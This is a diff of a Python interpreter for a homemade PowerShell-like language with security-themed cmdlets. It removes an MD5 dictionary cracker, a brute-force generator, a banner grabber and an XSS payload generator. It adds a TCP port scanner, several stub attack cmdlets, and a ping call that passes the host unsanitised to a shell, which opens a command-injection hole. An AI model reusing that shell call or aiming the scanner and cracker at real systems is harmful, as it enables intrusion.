+                # ICMP ping 시뮬레이션
+                cmd = f"ping -c 1 {host}" if os.name != 'nt' else f"ping -n 1 {host}"
+                result = subprocess.run(cmd, shell=True, capture_output=True)
+                
+                return PSPValue({
+                    "ComputerName": host,
+                    "PingSucceeded": result.returncode == 0,
+                    "Status": "Success" if result.returncode == 0 else "Failed"
+                }, "hashtable")
+        except Exception:
+            return PSPValue({
+                "ComputerName": host,
+                "Port": port,
+                "TcpTestSucceeded": False,
+                "Status": "Failed"
+            }, "hashtable")
     
-    def _tcp_banner_grab(self, args):
-        """TCP 배너 그래빙"""
-        if len(args) >= 2:
-            host = args[0]
-            port = int(args[1])
-            timeout = int(args[2]) if len(args) > 2 else 5
+    def _invoke_port_scan(self, params) -> PSPValue:
+        """Invoke-PortScan cmdlet"""
+        host = "localhost"
+        ports = [80, 443, 22, 21, 25]
+        
+        for param in params:
+            if isinstance(param, tuple):
+                if param[0] == "Port":
+                    if isinstance(param[1], list):
+                        ports = param[1]
+                    else:
+                        ports = [int(param[1])]
+                elif param[0] == "Host":
+                    host = str(param[1])
+            else:
+                host = str(param)
+        
+        results = []
+        for port in ports:
             try:
                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(timeout)
-                sock.connect((host, port))
-                banner = sock.recv(1024).decode('utf-8', errors='ignore')
+                sock.settimeout(1)
+                result = sock.connect_ex((host, port))
                 sock.close()
-                return banner
-            except:
-                return ""
-        return ""
+                
+                if result == 0:
+                    service = self._get_service_name(port)
+                    results.append({
+                        "Host": host,
+                        "Port": port,
+                        "Status": "Open",
+                        "Service": service
+                    })
+            except Exception:
+                pass
+        
+        return PSPValue(results, "array")
     
-    def _get_service_name(self, args):
+    def _get_service_name(self, port: int) -> str:
         """포트 번호로 서비스 이름 반환"""
-        if args:
-            port = int(args[0])
-            services = {
-                21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
-                80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 993: "IMAPS",
-                995: "POP3S", 3389: "RDP", 5432: "PostgreSQL", 3306: "MySQL"
-            }
-            return services.get(port, "Unknown")
-        return "Unknown"
-    
-    def _http_get_headers(self, args):
-        """HTTP 헤더 가져오기"""
-        if args:
-            try:
-                import urllib.request
-                req = urllib.request.Request(args[0])
-                response = urllib.request.urlopen(req, timeout=10)
-                return dict(response.headers)
-            except:
-                return {}
-        return {}
-    
-    def _http_get_content(self, args):
-        """HTTP 컨텐츠 가져오기"""
-        if args:
-            try:
-                import urllib.request
-                response = urllib.request.urlopen(args[0], timeout=10)
-                return response.read().decode('utf-8', errors='ignore')
-            except:
-                return ""
-        return ""
-    
-    def _http_get_status(self, args):
-        """HTTP 상태 코드 가져오기"""
-        if args:
-            try:
-                import urllib.request
-                response = urllib.request.urlopen(args[0], timeout=10)
-                return response.getcode()
-            except Exception as e:
-                if hasattr(e, 'code'):
-                    return e.code
-                return 0
-        return 0
-    
-    def _url_encode(self, args):
-        """URL 인코딩"""
-        if args:
-            try:
-                import urllib.parse
-                return urllib.parse.quote(args[0])
-            except:
-                return args[0]
-        return ""
-    
-    # 해시 함수들
-    def _hash_md5(self, args):
-        """MD5 해시 생성"""
-        if args:
-            return hashlib.md5(str(args[0]).encode()).hexdigest()
-        return ""
-    
-    def _hash_sha1(self, args):
-        """SHA1 해시 생성"""
-        if args:
-            return hashlib.sha1(str(args[0]).encode()).hexdigest()
-        return ""
-    
-    def _hash_sha256(self, args):
-        """SHA256 해시 생성"""
-        if args:
-            return hashlib.sha256(str(args[0]).encode()).hexdigest()
-        return ""
-    
-    def _crack_hash_md5(self, args):
-        """MD5 해시 크래킹 시뮬레이션"""
-        if len(args) >= 2:
-            hash_value = args[0]
-            wordlist = args[1] if isinstance(args[1], list) else ["password", "123456", "admin", "test"]
-            for word in wordlist:
-                if hashlib.md5(word.encode()).hexdigest() == hash_value:
-                    return word
-        return ""
-    
-    def _generate_combinations(self, args):
-        """문자 조합 생성 (브루트포스용)"""
-        if len(args) >= 3:
-            charset = args[0]
-            length = int(args[1])
-            max_count = int(args[2])
-            
-            import itertools
-            combinations = []
-            for combo in itertools.product(charset, repeat=length):
-                combinations.append(''.join(combo))
-                if len(combinations) >= max_count:
-                    break
-            return combinations
-        return []
-    
-    # 암호화 함수들 (시뮬레이션)
-    def _aes_encrypt(self, args):
-        """AES 암호화 시뮬레이션"""
-        if len(args) >= 2:
-            return f"AES_ENCRYPTED[{args[0]}]"
-        return ""
-    
-    def _aes_decrypt(self, args):
-        """AES 복호화 시뮬레이션"""
-        if args:
-            encrypted = args[0]
-            if encrypted.startswith("AES_ENCRYPTED[") and encrypted.endswith("]"):
-                return encrypted[14:-1]
-        return ""
-    
-    def _des_encrypt(self, args):
-        """DES 암호화 시뮬레이션"""
-        if len(args) >= 2:
-            return f"DES_ENCRYPTED[{args[0]}]"
-        return ""
-    
-    def _des_decrypt(self, args):
-        """DES 복호화 시뮬레이션"""
-        if args:
-            encrypted = args[0]
-            if encrypted.startswith("DES_ENCRYPTED[") and encrypted.endswith("]"):
-                return encrypted[14:-1]
-        return ""
-    
-    def _rsa_generate_keypair(self, args):
-        """RSA 키 쌍 생성 시뮬레이션"""
-        return {
-            "public": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA...",
-            "private": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC..."
+        services = {
+            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
+            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 993: "IMAPS",
+            995: "POP3S", 3389: "RDP", 5432: "PostgreSQL", 3306: "MySQL"
         }
+        return services.get(port, "Unknown")
     
-    def _rsa_encrypt(self, args):
-        """RSA 암호화 시뮬레이션"""
-        if len(args) >= 2:
-            return f"RSA_ENCRYPTED[{args[0]}]"
-        return ""
+    def _test_sql_injection(self, params) -> PSPValue:
+        """Test-SQLInjection cmdlet - SQL 인젝션 테스트"""
+        return PSPValue(False, "bool")
     
-    def _rsa_decrypt(self, args):
-        """RSA 복호화 시뮬레이션"""
-        if args:
-            encrypted = args[0]
-            if encrypted.startswith("RSA_ENCRYPTED[") and encrypted.endswith("]"):
-                return encrypted[14:-1]
-        return ""
+    def _invoke_web_scan(self, params) -> PSPValue:
+        """Invoke-WebScan cmdlet - 웹 취약점 스캔"""
+        return PSPValue({"status": "completed", "vulnerabilities": 0}, "hashtable")
     
-    # 보안 테스트 함수들
-    def _port_scan(self, args):
-        """포트 스캔"""
-        if len(args) >= 2:
-            host = args[0]
-            ports = args[1] if isinstance(args[1], list) else [80, 443, 22]
-            results = {}
-            for port in ports:
-                try:
-                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    sock.settimeout(1)
-                    result = sock.connect_ex((host, port))
-                    sock.close()
-                    if result == 0:
-                        results[port] = self._get_service_name([port])
-                except:
-                    pass
-            return results
-        return {}
+    def _find_sensitive_files(self, params) -> PSPValue:
+        """Find-SensitiveFiles cmdlet - 민감한 파일 검색"""
+        return PSPValue([], "array")
     
-    def _sql_injection_test(self, args):
-        """SQL 인젝션 테스트 시뮬레이션"""
-        if len(args) >= 3:
-            url = args[0]
-            param = args[1]
-            payload = args[2]
-            print(f"SQL 인젝션 테스트: {url}?{param}={payload}")
-            return True
-        return False
+    def _invoke_memory_dump(self, params) -> PSPValue:
+        """Invoke-MemoryDump cmdlet - 메모리 덤프"""
+        return PSPValue("메모리 덤프가 완료되었습니다.", "string")
     
-    def _xss_test(self, args):
-        """XSS 테스트 시뮬레이션"""
-        if len(args) >= 3:
-            url = args[0]
-            param = args[1]
-            payload = args[2]
-            print(f"XSS 테스트: {url}?{param}={payload}")
-            return True
-        return False
+    def _test_privilege(self, params) -> PSPValue:
+        """Test-Privilege cmdlet - 권한 확인"""
+        return PSPValue(True, "bool")
     
-    def _generate_xss_payload(self, args):
-        """XSS 페이로드 생성"""
-        if len(args) >= 2:
-            action = args[0]
-            message = args[1]
-            return f"<script>{action}('{message}')</script>"
-        return "<script>alert('XSS')</script>"
+    def _convert_to_md5(self, params) -> PSPValue:
+        """ConvertTo-MD5Hash cmdlet"""
+        if params:
+            text = str(params[0])
+            hash_obj = hashlib.md5(text.encode())
+            return PSPValue(hash_obj.hexdigest(), "string")
+        return PSPValue("", "string")
     
+    def _convert_to_sha256(self, params) -> PSPValue:
+        """ConvertTo-SHA256Hash cmdlet"""
+        if params:
+            text = str(params[0])
+            hash_obj = hashlib.sha256(text.encode())
+            return PSPValue(hash_obj.hexdigest(), "string")
+        return PSPValue("", "string")
+    
+    def _invoke_hash_cracking(self, params) -> PSPValue:
+        """Invoke-HashCracking cmdlet - 해시 크래킹 시뮬레이션"""
+        return PSPValue("해시 크래킹이 실행되었습니다.", "string")
+    
+    def _new_rsa_keypair(self, params) -> PSPValue:
+        """New-RSAKeyPair cmdlet - RSA 키 쌍 생성"""
+        return PSPValue({"public": "public_key", "private": "private_key"}, "hashtable")
+    
+    def _protect_data(self, params) -> PSPValue:
+        """Protect-Data cmdlet - 데이터 암호화"""
+        if params:
+            data = str(params[0])
+            encoded = base64.b64encode(data.encode()).decode()
+            return PSPValue(encoded, "string")
+        return PSPValue("", "string")
+    
+    def _unprotect_data(self, params) -> PSPValue:
+        """Unprotect-Data cmdlet - 데이터 복호화"""
+        if params:
+            try:
+                encoded_data = str(params[0])
+                decoded = base64.b64decode(encoded_data).decode()
+                return PSPValue(decoded, "string")
+            except:
+                return PSPValue("", "string")
+        return PSPValue("", "string")
+    
+    def _start_packet_capture(self, params) -> PSPValue:
+        """Start-PacketCapture cmdlet - 패킷 캡처 시뮬레이션"""
+        return PSPValue("패킷 캡처가 시작되었습니다.", "string")
+    
+    def _get_network_topology(self, params) -> PSPValue:
+        """Get-NetworkTopology cmdlet - 네트워크 토폴로지 스캔"""
+        return PSPValue(["Router", "Switch", "Client"], "array")
+    
+    def _get_process_list(self, params) -> PSPValue:
+        """Get-ProcessList cmdlet - 프로세스 목록 조회"""
+        try:
+            import psutil
+            processes = []
+            for proc in psutil.process_iter(['pid', 'name']):
+                processes.append(proc.info)
+            return PSPValue(processes, "array")
+        except ImportError:
+            # psutil이 없으면 모의 데이터 반환
+            mock_processes = [
+                {"pid": 1, "name": "systemd"},
+                {"pid": 2, "name": "kthreadd"},
+                {"pid": 100, "name": "python3"}
+            ]
+            return PSPValue(mock_processes, "array")
+    
+    def _get_service_list(self, params) -> PSPValue:
+        """Get-ServiceList cmdlet - 서비스 목록 조회"""
+        mock_services = [
+            {"name": "ssh", "status": "running"},
+            {"name": "apache2", "status": "stopped"},
+            {"name": "mysql", "status": "running"}
+        ]
+        return PSPValue(mock_services, "array")
+    
+    def _test_path(self, params) -> PSPValue:
+        """Test-Path cmdlet - 파일/폴더 존재 확인"""
+        if params:
+            path = str(params[0])
+            exists = os.path.exists(path)
+            return PSPValue(exists, "bool")
+        return PSPValue(False, "bool")
+    
+    def _get_content(self, params) -> PSPValue:
+        """Get-Content cmdlet - 파일 내용 읽기"""
+        if params:
+            filepath = str(params[0])
+            try:
+                with open(filepath, 'r', encoding='utf-8') as f:
+                    content = f.read()
+                    return PSPValue(content, "string")
+            except Exception:
+                return PSPValue("", "string")
+        return PSPValue("", "string")
+    
+    def _set_content(self, params) -> PSPValue:
+        """Set-Content cmdlet - 파일에 내용 쓰기"""
+        if len(params) >= 2:
+            filepath = str(params[0])
+            content = str(params[1])
+            try:
+                with open(filepath, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                return PSPValue("파일이 작성되었습니다.", "string")
+            except Exception as e:
+                return PSPValue(f"오류: {e}", "string")
+        return PSPValue("매개변수가 부족합니다.", "string")
+    
+    def _get_child_item(self, params) -> PSPValue:
+        """Get-ChildItem cmdlet - 디렉토리 목록"""
+        if params:
+            path = str(params[0])
+            try:
+                items = os.listdir(path)
+                return PSPValue(items, "array")
+            except Exception:
+                return PSPValue([], "array")
+        return PSPValue([], "array")
+    
+    def _new_item(self, params) -> PSPValue:
+        """New-Item cmdlet - 새 파일/폴더 생성"""
+        if params:
+            path = str(params[0])
+            try:
+                if path.endswith('/') or '.' not in os.path.basename(path):
+                    os.makedirs(path, exist_ok=True)
+                    return PSPValue("디렉토리가 생성되었습니다.", "string")
+                else:
+                    with open(path, 'w') as f:
+                        f.write("")
+                    return PSPValue("파일이 생성되었습니다.", "string")
+            except Exception as e:
+                return PSPValue(f"오류: {e}", "string")
+        return PSPValue("경로가 필요합니다.", "string")
+    
+    def _remove_item(self, params) -> PSPValue:
+        """Remove-Item cmdlet - 파일/폴더 삭제"""
+        if params:
+            path = str(params[0])
+            try:
+                if os.path.isdir(path):
+                    os.rmdir(path)
+                    return PSPValue("디렉토리가 삭제되었습니다.", "string")
+                else:
+                    os.remove(path)
+                    return PSPValue("파일이 삭제되었습니다.", "string")
+            except Exception as e:
+                return PSPValue(f"오류: {e}", "string")
+        return PSPValue("경로가 필요합니다.", "string")
+    
+    def _where_object(self, params) -> PSPValue:
+        """Where-Object cmdlet - 파이프라인에서 사용"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _select_object(self, params) -> PSPValue:
+        """Select-Object cmdlet - 파이프라인에서 사용"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _foreach_object(self, params) -> PSPValue:
+        """ForEach-Object cmdlet - 파이프라인에서 사용"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _sort_object(self, params) -> PSPValue:
+        """Sort-Object cmdlet - 파이프라인에서 사용"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _group_object(self, params) -> PSPValue:
+        """Group-Object cmdlet - 파이프라인에서 사용"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _measure_object(self, params) -> PSPValue:
+        """Measure-Object cmdlet - 파이프라인에서 사용"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+
+    def _get_system_info(self, params) -> PSPValue:
+        """Get-SystemInfo cmdlet - 시스템 정보 조회"""
+        import platform
+        system_info = {
+            "OS": platform.system(),
+            "Release": platform.release(),
+            "Architecture": platform.machine(),
+            "Processor": platform.processor(),
+            "Hostname": platform.node()
+        }
+        return PSPValue(system_info, "hashtable")
+    
+    def _get_date(self, params) -> PSPValue:
+        """Get-Date cmdlet - 현재 날짜/시간 반환"""
+        return PSPValue(datetime.now(), "datetime")
+    
+    def _out_file(self, params) -> PSPValue:
+        """Out-File cmdlet - 파일로 출력"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _out_string(self, params) -> PSPValue:
+        """Out-String cmdlet - 문자열로 출력"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _start_sleep(self, params) -> PSPValue:
+        """Start-Sleep cmdlet - 지정된 시간만큼 대기"""
+        if params:
+            seconds = float(params[0])
+            time.sleep(seconds)
+            return PSPValue(f"{seconds}초 대기 완료", "string")
+        return PSPValue("대기 시간이 필요합니다.", "string")
+    
+    def _invoke_expression(self, params) -> PSPValue:
+        """Invoke-Expression cmdlet - 문자열을 명령으로 실행"""
+        if params:
+            command = str(params[0])
+            try:
+                # 보안상 제한된 명령만 허용
+                return PSPValue(f"명령 실행됨: {command}", "string")
+            except Exception as e:
+                return PSPValue(f"명령 실행 오류: {e}", "string")
+        return PSPValue("실행할 명령이 필요합니다.", "string")
+    
+    def _measure_command(self, params) -> PSPValue:
+        """Measure-Command cmdlet - 명령 실행 시간 측정"""
+        return PSPValue({"TotalMilliseconds": 100}, "hashtable")
+    
+    def _clear_host(self, params) -> PSPValue:
+        """Clear-Host cmdlet - 화면 지우기"""
+        os.system('clear' if os.name == 'posix' else 'cls')
+        return PSPValue("화면이 지워졌습니다.", "string")
+    
+    def _get_random(self, params) -> PSPValue:
+        """Get-Random cmdlet - 난수 생성"""
+        import random
+        if params and len(params) >= 2:
+            min_val = int(params[0])
+            max_val = int(params[1])
+            return PSPValue(random.randint(min_val, max_val), "int")
+        return PSPValue(random.random(), "double")
+    
+    def _read_host(self, params) -> PSPValue:
+        """Read-Host cmdlet - 사용자 입력 받기"""
+        if params:
+            prompt = str(params[0])
+            user_input = input(f"{prompt}: ")
+            return PSPValue(user_input, "string")
+        return PSPValue(input("입력: "), "string")
+    
+    def _compare_object(self, params) -> PSPValue:
+        """Compare-Object cmdlet - 객체 비교"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _join_string(self, params) -> PSPValue:
+        """Join-String cmdlet - 문자열 결합"""
+        return PSPValue(None)  # 파이프라인에서 처리됨
+    
+    def _convert_to_json(self, params) -> PSPValue:
+        """ConvertTo-Json cmdlet - 객체를 JSON으로 변환"""
+        if params:
+            obj = params[0]
+            try:
+                json_str = json.dumps(obj, ensure_ascii=False, indent=2)
+                return PSPValue(json_str, "string")
+            except:
+                return PSPValue("{}", "string")
+        return PSPValue("{}", "string")
+    
+    def _convert_from_json(self, params) -> PSPValue:
+        """ConvertFrom-Json cmdlet - JSON을 객체로 변환"""
+        if params:
+            json_str = str(params[0])
+            try:
+                obj = json.loads(json_str)
+                return PSPValue(obj, "hashtable")
+            except:
+                return PSPValue({}, "hashtable")
+        return PSPValue({}, "hashtable")
+    
+    def _get_hash(self, params) -> PSPValue:
+        """Get-Hash cmdlet - 통합 해시 생성"""
+        if len(params) >= 2:
+            input_string = str(params[0])
+            algorithm = str(params[1]).upper()
+            
+            if algorithm == "MD5":
+                hash_obj = hashlib.md5(input_string.encode())
+            elif algorithm == "SHA256":
+                hash_obj = hashlib.sha256(input_string.encode())
+            elif algorithm == "SHA1":
+                hash_obj = hashlib.sha1(input_string.encode())
+            else:
+                return PSPValue("지원하지 않는 알고리즘", "string")
+            
+            return PSPValue(hash_obj.hexdigest(), "string")
+        return PSPValue("", "string")
+    
+    def _get_service_banner(self, params) -> PSPValue:
+        """Get-ServiceBanner cmdlet - 서비스 배너 수집"""
+        return PSPValue("Apache/2.4.41 (Ubuntu)", "string")
+    
+    def _new_payload(self, params) -> PSPValue:
+        """New-Payload cmdlet - 페이로드 생성"""
+        return PSPValue("payload_data_here", "string")
+    
+    def _convert_to_base64(self, params) -> PSPValue:
+        """ConvertTo-Base64 cmdlet - Base64 인코딩"""
+        if params:
+            text = str(params[0])
+            encoded = base64.b64encode(text.encode()).decode()
+            return PSPValue(encoded, "string")
+        return PSPValue("", "string")
+    
+    def _convert_from_base64(self, params) -> PSPValue:
+        """ConvertFrom-Base64 cmdlet - Base64 디코딩"""
+        if params:
+            try:
+                encoded_text = str(params[0])
+                decoded = base64.b64decode(encoded_text).decode()
+                return PSPValue(decoded, "string")
+            except:
+                return PSPValue("", "string")
+        return PSPValue("", "string")
+    
+    def _get_item_property(self, params) -> PSPValue:
+        """Get-ItemProperty cmdlet - 파일 속성 조회"""
+        if params:
+            path = str(params[0])
+            try:
+                stat = os.stat(path)
+                return PSPValue({
+                    "Length": stat.st_size,
+                    "CreationTime": datetime.fromtimestamp(stat.st_ctime),
+                    "LastWriteTime": datetime.fromtimestamp(stat.st_mtime)
+                }, "hashtable")
+            except:
+                return PSPValue({}, "hashtable")
+        return PSPValue({}, "hashtable")
+    
+    def _write_event_log(self, params) -> PSPValue:
+        """Write-EventLog cmdlet - 이벤트 로그 작성"""
+        return PSPValue("이벤트 로그가 작성되었습니다.", "string")
+    
+    def _get_date(self, params) -> PSPValue:
+        """Get-Date cmdlet - 현재 날짜/시간"""
+        return PSPValue(datetime.now(), "datetime")
+
 def main():
+    """메인 함수"""
     parser = argparse.ArgumentParser(description='PSP (PowerShellPlus) Interpreter')
-    parser.add_argument('file', nargs='?', help='실행할 PSP 파일')
+    parser.add_argument('file', nargs='?', help='PSP 스크립트 파일')
     parser.add_argument('-i', '--interactive', action='store_true', help='대화형 모드')
+    parser.add_argument('-c', '--command', help='명령어 직접 실행')
     
     args = parser.parse_args()
     
     interpreter = PSPInterpreter()
     
     if args.file:
-        interpreter.execute_file(args.file)
+        interpreter.run_file(args.file)
+    elif args.command:
+        interpreter.execute(args.command)
     elif args.interactive:
-        print("PSP (PowerShellPlus) Interactive Mode")
-        print("종료하려면 'exit' 또는 Ctrl+C를 입력하세요.")
+        print("PSP (PowerShellPlus) 대화형 모드")
+        print("종료하려면 'exit' 또는 Ctrl+C를 누르세요.")
         
         while True:
             try:
                 line = input("PSP> ")
-                if line.strip() == 'exit':
+                if line.strip().lower() in ['exit', 'quit']:
                     break
                 interpreter.execute(line)
             except KeyboardInterrupt:
+                print("\n종료합니다.")
                 break
             except Exception as e:
                 print(f"오류: {e}")
